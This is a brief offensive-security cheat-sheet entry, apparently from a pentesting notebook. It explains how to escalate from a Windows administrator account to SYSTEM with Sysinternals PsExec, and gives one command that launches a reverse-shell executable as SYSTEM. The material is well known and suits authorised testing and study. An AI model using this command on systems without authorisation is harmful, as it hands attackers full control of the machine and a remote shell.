# PSEXEC (admin to system)

## <mark style="color:red;">PSEXEC.exe</mark>

To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals

{% embed url="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" %}

```shell
PsExec64.exe -accepteula -i -s reverse_shell.exe
```
